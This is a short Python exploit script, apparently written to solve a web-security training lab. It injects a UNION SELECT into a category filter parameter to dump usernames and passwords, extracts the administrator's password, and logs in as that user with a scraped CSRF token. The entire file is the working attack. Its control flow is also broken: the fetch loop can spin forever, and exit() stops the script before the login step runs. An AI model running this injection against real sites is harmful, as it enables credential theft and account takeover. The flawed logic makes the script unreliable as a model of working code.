import requests
from bs4 import BeautifulSoup

url = input("Nhập URL: ").rstrip("/")

union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users--"
response = requests.get(union_url)

while response.status_code:
    soup = BeautifulSoup(response.text, "html.parser")
    table_rows = soup.find_all("tr")

    password = None
    for row in table_rows:
        th = row.find("th")
        td = row.find("td")
        if th and td and th.text.strip() == "administrator":
            password = td.text.strip()
            break

    if password:
        print(f"Tìm thấy password của admin: {password}")
        exit()

login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}

response = session.post(login_url, data=data)

if "Welcome" in response.text or response.status_code == 200:
    print("Solved the lab!")